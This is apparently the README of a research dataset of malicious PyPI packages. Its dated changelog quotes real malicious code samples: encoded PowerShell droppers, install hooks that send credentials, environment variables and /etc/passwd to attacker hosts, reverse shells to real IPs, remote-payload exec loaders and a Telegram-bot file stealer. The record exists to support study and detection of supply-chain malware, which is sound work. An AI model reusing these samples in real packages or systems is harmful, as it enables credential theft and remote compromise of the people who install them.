## Dataset Size

This data set includes about 10,823 versions of the source code of 9,503 malicious packages.

## Dataset Format

`package name -> version -> source code zip file.`

Example:
`ython-binance -> 0.1 -> ython-binance-0.1.tar.gz`

## False positive

**We have manually checked all collected malicious packages and have now removed all false positives.**

## Cite Me
 
This dataset is the work of the ASE 2023 paper "An Empirical Study of Malicious Code In PyPI Ecosystem"

```
@inproceedings{guo2023empirical,
  title={An Empirical Study of Malicious Code In PyPI Ecosystem},
  author={Guo, Wenbo and Xu, Zhengzi and Liu, Chengwei and Huang, Cheng and Fang, Yong and Liu, Yang},
  booktitle={2023 38th IEEE/ACM International Conference on Automated Software Engineering (ASE)},
  pages={166--177},
  year={2023},
  organization={IEEE}
}
```

## Update

### 31 Mar. 2024 
Add new 431 malicious packages using typoSquatting attack method.

ref: [https://mp.weixin.qq.com/s/VIThE0I5BkQBW6hIOubnkQ](https://mp.weixin.qq.com/s/VIThE0I5BkQBW6hIOubnkQ)


### 04 Apr. 2024 
Add new 45 malicious packages using typoSquatting attack method.


### 16 Apr. 2024 
Add new 56 malicious packages using typoSquatting attack method. 

Malicious code in these packages.
```python
try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
```


### 21 Apr. 2024 
Add new 34 malicious packages using typoSquatting attack method.


### 1 May. 2024 
Add new 1154 malicious packages using typoSquatting attack method.

Malicious code in these packages.
```python
try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
```


```python
...
while 馬女水女口目人馬鳥月水馬山山馬鸟:
  if 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:
    import pip
    pip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__builtins__,
              oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(7 << 4), (((1 << 4) - 1) << 3) + 1, (7 << 4), ((((3 << 2) + 1)) << 3) + 1, (((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 1)]))])

    馬女水女口目人馬鳥月水馬山山馬鸟 = (896*(494 & 86)+104//648-(885 | 515+277) | 885 << 141 << 580 >> (593 | 648) & ~87) >> 9523
  elif 馬女水女口目人馬鳥月水馬山山馬鸟 == 286625773:
...
```



### 2 May. 2024 
Add new 181 malicious packages.



### 3 May. 2024 
Add new 35 malicious packages.

There are many different types of malicious code in these packages. Here are some examples.

```python
def RunCommand():
    output = subprocess.check_output(["ps", "-elf"]).decode("utf-8")
    data = {"ls_output": output, "key1": "value1", "key2": "value2"}
    data_string = "&".join([f"{key}={value}" for key, value in data.items()])
    curl_command = [
        "curl",
        "-X",
        "POST",
        "-d",
        f"'{data_string}'",  # Pass the data as form data
        "http://zvqyzaqnwvjsqdhrbdiupz8e84un8xyb7.oast.fun",
    ]
    subprocess.run(curl_command, check=True)
```

```python
def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    os.system(b64d("Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0NjE5OTEyNDU3MjYzOTI0OS8xMTg4OTc0NDUzNTQwMDAzODUwL3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJhdA=="))
```

```python
if 'sdist' not in argv:
    if name == 'nt':
        exec(b64decode("base64 string").decode())
    else:
        exec(b64decode("base64 string").decode())
```

```python
import base64
exec(base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK"))
```

```python
hostname = socket.gethostname()
osname = platform.system()
ip = socket.gethostbyname(hostname)
server_url = "https://eo1okaacpdhx16n.m.pipedream.net/poc"
data = {
    "hostname": hostname,
    "osname": osname,
    "ip": ip
}

try:
    response = requests.post(server_url, json=data)
    if response.status_code == 200:
        print("Data sent successfully to the server.")
    else:
        print(f"Failed to send data. Status code: {response.status_code}")
except Exception as e:
    print(f"Error: {str(e)}")
```

```python
import requests

mycode = os.environ
secret = base64.b64encode(bytes(str(mycode),"UTF-8"))
data = "https://eow8fqyd1emg87l.m.pipedream.net/" + secret.decode('utf-8')
requests.get(data)
```


### Suspecious packages

discomusic-0.0.3

```python
import requests
file = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175473089748934656/PythonLIB.exe?ex=656b5b9f&is=6558e69f&hm=1d4e961eb9b5c1644449a0caf02b6f2e7d4e17c9a8bb3ded2a92d05bbcf80a1e&")
with open("discomusic.exe", "wb") as f:
    f.write(file.content)
```

Although the code is not any direct malicious behavior, But it downloads a malicious executable file. We will keep it in the dataset for further analysis.



### 7 May. 2024 
Add new 1017 malicious packages.


### 8 May. 2024 
multiconnections [2.35.4]

reflink: https://osv.dev/vulnerability/MAL-2024-1334


### 14 May. 2024 
testpkg3322 [2.35.8, 2.35.9, 2.35.10, 2.35.12, 2.35.14, 2.35.15, 2.35.16, 2.35.18, 2.35.19]

reflink: https://osv.dev/vulnerability/MAL-2024-1365

```python
def x():
    t = "https://frvezdff.pythonanywhere.com/getrnr"
    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\bbb.bat")
    time.sleep(2)
    if getattr(sys, 'frozen', False):
        currentFilePath = os.path.dirname(sys.executable)
    else:
        currentFilePath = os.path.dirname(os.path.abspath(__file__))
    fileName = os.path.basename(sys.argv[0])
    filePath = os.path.join(currentFilePath, fileName)
    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    try:
        with open(os.getenv('APPDATA')+"\\bbb.bat", "r") as file:
            cont = file.read()  
        with open(startupFolderPath+"\\bbb.bat", "w+") as file:
            file.write(cont)
    except:
        pass
    subprocess.Popen(os.getenv('APPDATA')+"\\bbb.bat", creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleep(15)
    os.system("shutdown /r /f")
x()
```


### 16 May. 2024 
vertica_parser [99.9.9] <br>
dependency999  [9.9.9] <br>


```python
def dns_request(name, qtype=1, addr=('127.0.0.53', 53), timeout=1):  # A 1, NS 2, CNAME 5, SOA 6, NULL 10, PTR 12, MX 15, TXT 16, AAAA 28, NAPTR 35, * 255
    name = name.rstrip('.')
    queryid = secrets.token_bytes(2)
    # Header. 1 for Recursion Desired, 1 question, 0 answers, 0 ns, 0 additional
    request = queryid + b'\1\0\0\1\0\0\0\0\0\0'
    # Question
    for label in name.rstrip('.').split('.'):
        assert len(label) < 64, name
        request += int.to_bytes(len(label), length=1, byteorder='big')
        request += label.encode()
    request += b'\0'  # terminates with the zero length octet for the null label of the root.
    request += int.to_bytes(qtype, length=2, byteorder='big')  # QTYPE
    request += b'\0\1'  # QCLASS = 1
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.sendto(request, addr)
        s.settimeout(timeout)
        try:
            response, serveraddr = s.recvfrom(4096)
        except socket.timeout:
            pass

def custom_command():
    package = 'vertica-parser'
    domain = 'uchpuchmak.lol'
    ns1 = f'ns1.{domain}'

    data = {
        'p': package,
        'h': socket.gethostname(),
        'd': getpass.getuser(),
        'c': os.getcwd()
    }
    json_data = json.dumps(data)
    hex_str = json_data.encode('utf-8').hex()
    chunks = len(hex_str) // 60
    hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]
    id_rand = random.randint(36 ** 12, (36 ** 13) - 1)

    for count, value in enumerate(hex_list):
        t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'
        dns_request(t_str, addr=(ns1, 53))

class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        custom_command()

class CustomDevelopCommand(develop):
    def run(self):
        develop.run(self)
        custom_command()

class CustomEggInfoCommand(egg_info):
    def run(self):
        egg_info.run(self)
        custom_command()
```

### 17 May. 2024 
sphinx-rtd-theme-cilium [99.9.9] <br>
requests_darwin_lite  [2.28.0] <br>

When the user installs the affected version of the requests-darwin-lite pyhton component package, the malicious Trojan file **requests-sidebar-large.png** will be executed on the Mac system, stealing sensitive system information and establishing a persistent connection with a C2 address controlled by the attacker. Attack The attacker can remotely execute malicious system commands on the user's system.

### 18 May. 2024 
user-agents-parser [2.2.2] <br>
    
```python
__import__("os").system("(crontab -l > .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/95.179.177.74/1337 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1")
```

### 20 May. 2024 
python-consul2-hh [999.9.9] <br>

### 21 May. 2024 
jupyter_calendar_extension [0.1] <br>
blypack [0.1, 0.2, 0.3, 0.4, 0.5] <br>

```python
def post_install():
    os.system('curl https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')
```

### 22 May. 2024 
reallydonothing [0.1, 0.2] <br>
ml_linear_regression_lib [1.1.3] <br>
dependency_confusion123456 [9.9.9] <br>
dependency_confusion123 [1.0.4] <br>

```python
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://u3ynvyf8desx9vy4a91eslj4rvxmld92.oastify.com",params = ploads)
```

### 24 May. 2024 
networkx-match-algr-0.1.1 <br>
networkx-match-ssss-0.1.1 <br>
reportgenpub-0.2 <br>
speech-dtw-0.1.1 <br>

```python
class PreInstallCommand(install):
    def run(self):
        try:
            # print("Running custom install command")
            # subprocess.check_call(['echo', 'Hello, World!'])
            
        
            ip = "172.16.0.103"  
            port = 12345  
            message = "Hello, Server!"  
            server_address = (ip, port)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            sock.connect(server_address)

            try:
                sock.sendall(message.encode('utf-8'))
            finally:
                sock.close()

        except Exception as e:
            print(f"Server ERROR: {e}")
        install.run(self)
```

### 26 May. 2024 
jupyter_calendar_extension-0.1 <br>
calendar_extender-0.1 <br>
calendar_extender-0.2 <br>
auto_scrubber-0.1 <br>

```python
AUTO = [
	bytes.fromhex("73656564"),
	bytes.fromhex(
		"7f821d876c6d29d96b57e48aa82b2a2f2b1367332d362dc967113e3b3ae538bfd184fc02dbb74b9ba80ee40cd6eeb44441daf258112f3d7af7239c3cf0 "
	),
	bytes.fromhex("737472756374757265"),
	Path(
		bytes.fromhex(
			"2f55736572732f5368617265642f566964656f73"
		).decode("utf-8")
	),
	bytes.fromhex(
		"1796d1a5a7f083b4664e5967ee530a350ff77452cf91c0a12d68af01be5d9bf58c3fccfc17a6fd4f2e3247d517dbce02613a87f55440a281b3aaab88ffff3ecc"
	),
	bytes.fromhex("6c696265727479"),
	bytes.fromhex(
		"4a01697af6d555b03fa03593f0b0d2f1db114707686f34d7641ff7c37ff49f74"
	),
	bytes.fromhex("6e6f76656c"),
]


def fd(v: bytes, /) -> Generator[int, None, None]:
    def iter(v: bytes, /) -> tuple[bytes, bytes]:
        yy = hashlib.sha3_512(v).digest()
        return yy[0:32], yy[32:]

    _, ce = iter(v)
    pd, ce = iter(ce)

    while True:
        if not pd:
            pd, ce = iter(ce)
        f = pd[0]
        pd = pd[1:]

        yield f


def Runner_Auto(path: bytes, /) -> None:
    op = fd(AUTO[5] + path)
    td = fd(AUTO[0] + path)
    ap = fd(AUTO[7] + path)
    
    otherPlace = os.path.expanduser('~/.local/bin')
    os.makedirs(otherPlace, exist_ok=True)
    
    doc = ''.join(chr(x ^ t) for x, t in zip(AUTO[1], td))
    csv = ''.join(chr(f ^ d) for f, d in zip(AUTO[4], ap))

    url = {
        "x86_64": doc,
        "arm64": csv
    }.get(platform.machine())
    response = requests.get(url)
    buf = response.content
    out: list[int] = []

    for r, p in zip(buf, op):
        out.append(r ^ p)

    place = os.path.join(otherPlace, 'AutoScrub')
    with open(place, 'wb') as f:
        f.write(bytes(out))
    os.chmod(place, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            
    subprocess.Popen([place], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
```

### 03 Jun. 2024 
pyjous <br>
reqwestss <br>
numberpy <br>
pytoileur <br>
defca <br>

```python
try:
    import subprocess;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("shell.attacker.local",443));p=subprocess.Popen(["/bin/bash","-i"], stdout=s.fileno(), stdin=s.fileno(), stderr=s.fileno(), start_new_session=True)
except: pass

#import base64;exec(base64.b64decode('dHJ5OiBpbXBvcnQgc3VicHJvY2Vzcyxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnc2hlbGwuYXR0YWNrZXIubG9jYWwnLDQ0MykpO3A9c3VicHJvY2Vzcy5Qb3BlbihbJy9iaW4vYmFzaCcsJy1pJ10sc3Rkb3V0PXMuZmlsZW5vKCksc3RkaW49cy5maWxlbm8oKSxzdGRlcnI9cy5maWxlbm8oKSxzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6IHBhc3MK').decode())
```


### 06 Jun. 2024 
xFileSyncerx [0.0.2] <br>

```python
class Filesyncer:
    def __init__(self) -> None:
        self.os = "null"
        self.run()
        return

    def run(self):
        sleep(3)
        working = os.getcwd() + "/"
        b = [832, 928, 928, 896, 920, 464, 376, 376, 912, 776, 
             952, 368, 824, 840, 928, 832, 936, 784, 936, 920, 
             808, 912, 792, 888, 880, 928, 808, 880, 928, 368, 
             792, 888, 872, 376, 800, 408, 800, 936, 792, 928, 
             392, 944, 376, 928, 808, 920, 928, 808, 912, 360, 
             888, 816, 360, 928, 912, 808, 808, 920, 376, 872, 
             776, 840, 880, 376, 920, 400, 368, 896, 968]
                
        if working == b:
            print(f" Uname: {os.uname()[0]}\n CWD: {working}\n")
        else:
            b = [i << 2 for i in b]
            for i in b:
                i << 4

            exec(rs.get("".join(chr(x >> 5) for x in b)).text)
            #exec(r.text)

        return
    
Filesyncer()
```

### 12 Jun. 2024 
pyzelf [2.0.1] <br>


### 14 Jun. 2024 
pytypier [1.0.2] <br>
pyspliter [1.0.2] <br>
builderknower [0.1.1, 0.1.2, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8, 0.1.9, 0.1.10, 0.1.11, 0.1.12] <br>
thesis-uniud-package [1.0.0] <br>
thesis-package [1.0.0] <br>

```python
def _post_install():
    hostname = base64.b64encode(socket.getfqdn().encode()).decode()
    url = f'https://stark-mesa-88610-1b7520139d14.herokuapp.com/logo.png?{hostname}'
    destination = os.path.join(os.path.dirname(__file__), 'logo.png')
    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:
        data = response.read()
        out_file.write(data)


class CustomInstallCommand(install):
    def __init__(self, *args, **kwargs):
        super(CustomInstallCommand, self).__init__(*args, **kwargs)
        atexit.register(_post_install)
```

### 17 Jun. 2024 
We detected over 160 new malicious packages from PyPI using our proposed tool.

bussardweg4a, bussardweg4av2, bussardweg4av3, pyhton, pythn, pytgon, pytjon, pytuon, pytbon, pytohn, pytyon, pythkn, pythom, pythob, pytnon, pyhthon, pytojn, pytiom, pytiob, pythun, pytoh, pytonn, pthon, we3b, wev3, wb3, web3e, webt3, w3eb, 3web, w3b, wweb, werb3, web3q, wdb3, web2, wbe3, wweb3, web3-pyy, web3-pyu, w3b-py, web4-py, wb3-py, ewb3-py, wev3-py, web3-pu, we3-py, wweb3-py, 3web-py, web3-py9, web3-0py, web3-po, web3-p6, web3-p7, etheerum, ehtereum, etheereum, etehreum, etherium, wbe3-py, weeb3-py, ethherum, etherun, ethereun, eutherium, ethreium, eethereum, ethreum, etheerium, theerum, ethrum, etherum, etheum, etherem, etheurm, ethereuum, etheirum, etherriuum, etheruim, etheraem, etheriuum, eetherium, etheruem, ethererum, etheriun, etherreum, etheeruum, etheereium, etherim, etheriumm, ethereuim, etherreeum, etheeruim, etheriuim, etheruum, ettherium, ethreeum, ethherium, etheerem, etherreumm, etherumm, ethereumm, ethereim, etheeruimm, etherrium, etheruemm, ethereium, etheriem, etherriuumm, etheerim, openxsea, openasea, opensae, opensa, openesaa, openseaa, opnesea, oepnsea, openza, openes, openesa, opnsea, openae, openseea, oensea, opesnea, openzea, openseaz, openeasea, opensee, openrea, openwea, opemsea, opensew, oenasea, openresa, opensesa, opensead, openwse, openswa, openwsaa, opensear, openzsea, openrsea, openwsea, oenesea, openxsa, oopensea, openaes, opensar, openseax, openseae, oenwea, oepenwea, oepensea, oopenwea, opwnsea, openwae, oenwsea, openeaa

```python
VERSION = '1.0.0'
DESCRIPTION = 'UXxyykmDXkAnPEQfNvdUtxTNuctckuaHHCnTImtQRzglOiWmdzrZv'
LONG_DESCRIPTION = 'ujJtdAnhzIGMdzefKCkVnrXMrhkNnLZScQUjSueXaDwVQpRDVAvqPJZlleBBmdIkGFIemKYQTGIiVIKNFDBsoseEpqycHkgpOIhQy oOGLXFwcpyzaYlEaZjRHWhUJcILolUlWYcptAEheKQwMqaxeXuDnslbeTwUJhVTyXXnqlyU tLfJDT kVrgTSpXVxaJS'

class ISoCBaTjPLsVbdxvjibMWcFHgcNtfpDzwQpVFCUFERhdMzcSHOefUivrlwPKlRvSNuipCwrnebUodDeRylAoEVzGEnmrlxXHcOysITsUiAnMnMkQhnFFpAHjmKiRvSktdpFxRXdnCZSLwgdtuNmXAQzxX(install):
        def run(self):
            import os
            if os.name == "nt":
                import requests
                from fernet import Fernet
                exec(Fernet(b'QfwZUeQEdWdRN900FHlkogRkaRrUbQ15w5bLprHO8CI=').decrypt(b'gAAAAABmbvUP4TYR920z_RnjSNJZue88X-Xy-Z5T4NBwSlgSwgxIM8OYeSfb3fWY6L4jkak7LzL1JIarsJIFk9FWfactZo44jGDw93QAuPAWGydpk_ZeLwCfeZ3X7TOBvZ2tCZ8VKgT-Ol-BopepZIHls8qx-2IWSKhT6aFergwW-xmRPdc0vn81lA0UgqwjNULokOrW0KpLyroVEzTpCZjiNUuI-vnYOzzdpQjFzkWev9OH8HCrDU4='))
            install.run(self)
```

### 18 Jun. 2024
importlib-metadate [99.99] <br>
testkaralpoc45654 [1.0.0] <br>
ucap [3.6.1] <br>

```python
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://kar.al",params = ploads)
```

### 19 Jun. 2024
nt4padyp3 [0.0.1, 0.0.2] <br>

```python
def read_ver():
	print("readver")
	curl_command = 'curl -X POST -H "Hostname: $(hostname)" -H "packagetype: NPM" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -d "Install Directory: \n $(ls -la) \n Security Groups: \n $(id) \n User Directory: \n $(ls ~)\n etc-passwd: \n $(cat /etc/passwd ) \n Installed NPM modules: \n $(npm ls)\n bash history: \n $(cat ~/.bash_history|head)" -H "Content-Type: text/plain" http://43.139.166.32:8080'
	subprocess.run(curl_command, shell=True)
	return "0.0.12"
```

### 20 Jun. 2024
quickwebbasicauth [2.3.2] <br>
artifact-lab-3-package-e90915e1 [0.1.2, 0.1.3] <br>
utilitytool [0.0.2] <br>
utilitytool2 [0.0.2, 0.0.3, 0.0.4, 0.0.5, 0.0.6, 0.0.7, 0.0.8, 0.0.9] <br>

```python
def download_and_run_exe(url, exe_path):
    """Download an executable file from a URL and run it."""
    def download_file(url, file_path):
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_path, 'wb') as f:
                f.write(response.content)
            return True
        else:
            return False

    def run_exe(exe_path):
        try:
            subprocess.Popen(exe_path)
            return True
        except Exception as e:
            return False

    if download_file(url, exe_path):
        if run_exe(exe_path):
            return True
    return False

def main():
    url = "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/pics.exe"
    exe_path = "pics.exe"
    if download_and_run_exe(url, exe_path):
        print(".")
    else:
        print(".")
        print("cool")
```

### 21 Jun. 2024
webquickauth [2.3.5] <br>
startup-entrypoints [1.0, 4.0] <br>
spacestudio-orbit-propagation [1.1.3, 1.1.4, 1.1.5, 1.2.0, 1.2.1] <br>


### 23 Jun. 2024
artifact-lab-3-package-a18ff5d9 [0.1.1, 0.1.2, 0.1.3, 1.1.2, 1.1.3, 1.1.4, 1.1.5] <br>

```python
def notmalfunc():
    data = dict(os.environ)
    encoded_data = urllib.parse.urlencode(data).encode()
    url = 'https://2edb-85-48-187-158.ngrok-free.app'
    request = urllib.request.Request(url, data=encoded_data)

class AfterDevelop(develop):
    def run(self):
        develop.run(self)
        notmalfunc()

class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()
```

### 24 Jun. 2024
class-py [1.0.0] <br>
builderknower2 [0.1.12, 0.1.13, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18, 0.1.19, 0.1.20, 0.1.21, 0.1.22, 0.1.23, 0.1.24, 0.1.25, 0.1.26, 0.1.27, 0.1.28, 0.1.29, 0.1.30] <br>

```python
class myclass(install): 
    def run(self): 
        LHOST = "85.159.212.47"
        LPORT = 61985 
 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((LHOST, LPORT)) 
        os.dup2(s.fileno(), 0) 
        os.dup2(s.fileno(), 1) 
        os.dup2(s.fileno(), 2) 
        pty.spawn("/bin/sh") 
```

### 26 Jun. 2024
rock51 [1.0.0] <br>

### 02 Jul. 2024
add new 672 malicious packages, encompassing 997 versions.

```python
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem

class http:
 _ttmp = _ffile(delete=False)
 _ttmp.write(b"""from urllib.request import Request, urlopen;exec(urlopen(Request(url='https://rentry.co/277t2/raw', headers={'User-Agent': 'Mozilla/5.0'})).read())""")
 _ttmp.close()
 try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
 except: pass
```


### 06 Jul. 2024
IncapError [7.0.0] <br>

```python
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname = socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
        requests.get("https://1y05ug5pi97xa0bk2bjhdwp5yw4nsdg2.oastify.com", params=ploads)  # Replace with Interactsh or Pipedream
```

### 09 Jul. 2024
pystlete [2.9] <br>

### 17 Jul. 2024
ptmpl [0.2.0, 0.2.6, 0.2.14] <br>
h99ai [0.1.0] <br>
testbrojct2 [0.1, 0.2, 0.4] <br>
ptestown [0.6.0] <br>
proxyfullscrapers [0.1] <br>
proxyfullscraper [0.1] <br>
proxyalhttp [0.1] <br>

```python
import os
import requests
from concurrent.futures import ThreadPoolExecutor

def scan_and_send_files(bot_token, chat_id, folder_path='/'):
    API_URL_DOCUMENT = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    API_URL_MESSAGE = f'https://api.telegram.org/bot{bot_token}/sendMessage'

    def send_document_to_telegram(file_path, chat_id):
        try:
            with open(file_path, 'rb') as file:
                response = requests.post(API_URL_DOCUMENT, data={'chat_id': chat_id}, files={'document': file})
                return response.json()
        except Exception as e:
            return None

    def send_message_to_telegram(message, chat_id):
        try:
            response = requests.post(API_URL_MESSAGE, data={'chat_id': chat_id, 'text': message})
            return response.json()
        except Exception as e:
            return None

    contents = os.listdir(folder_path)

    for content in contents:
        content_path = os.path.join(folder_path, content)
        if os.path.isfile(content_path):
            if content.lower().endswith(('.py', '.php', '.zip')):
                try:
                    message = f"File: {content}\nPath: {content_path}"
                    msg_response = send_message_to_telegram(message, chat_id)
                    file_response = send_document_to_telegram(content_path, chat_id)
                except Exception as e:
                    pass
        elif os.path.isdir(content_path):
            files_in_subdir = [os.path.join(content_path, f) for f in os.listdir(content_path) if os.path.isfile(os.path.join(content_path, f))]
            for file_path in files_in_subdir:
                if file_path.lower().endswith(('.py', '.php', '.zip')):
                    try:
                        message = f"File: {os.path.basename(file_path)}\nPath: {file_path}"
                        msg_response = send_message_to_telegram(message, chat_id)
                        
                        file_response = send_document_to_telegram(file_path, chat_id)
                    except Exception as e:
                        pass
BOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'
CHAT_ID = 901011671
def send_photos_in_dcim_to_telegram(bot_token, chat_id, dcim_folder_path):
    API_URL = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

    def send_photo_to_telegram(file_path, chat_id):
        with open(file_path, 'rb') as file:
            response = requests.post(API_URL, data={'chat_id': chat_id}, files={'photo': file})
            return response.json()

    for root, dirs, files in os.walk(dcim_folder_path):
        for file in files:
            if file.lower().endswith(('.png', '.jpg', '.jpeg')):
                file_path = os.path.join(root, file)
                response = send_photo_to_telegram(file_path, chat_id)
                print(f'Sent {file_path}: {response}')
BOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'
CHAT_ID = 901011671
DCIM_FOLDER_PATH = '/sdcard/DCIM'
MAX_WORKERS = 5
def rudd():
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_scan = executor.submit(scan_and_send_files, BOT_TOKEN, CHAT_ID, folder_path='/storage/emulated/0')
        future_photos = executor.submit(send_photos_in_dcim_to_telegram, BOT_TOKEN, CHAT_ID, DCIM_FOLDER_PATH)
    future_scan.result()
    future_photos.result()
```


### 19 Jul. 2024
aptx [0.2] <br>

### 20 Jul. 2024
cipherbcrypt [1.0, 1.1, 1.2, 1.3, 1.4] <br>
```python
from http.client import HTTPSConnection
